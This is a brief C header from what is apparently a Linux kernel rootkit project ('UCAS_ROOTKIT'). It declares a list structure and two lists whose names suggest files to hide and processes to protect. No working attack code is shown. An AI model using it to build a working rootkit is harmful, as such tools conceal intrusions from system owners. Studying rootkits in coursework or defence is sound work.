//
// Created by black on 22-10-17.
//

#ifndef UCAS_ROOTKIT_DATA_H
#define UCAS_ROOTKIT_DATA_H

#include <linux/list.h>

struct List {
    const char *data;
    struct list_head list;
};

extern struct list_head filename_list;

extern struct list_head protect_process_list;



#endif //UCAS_ROOTKIT_DATA_H
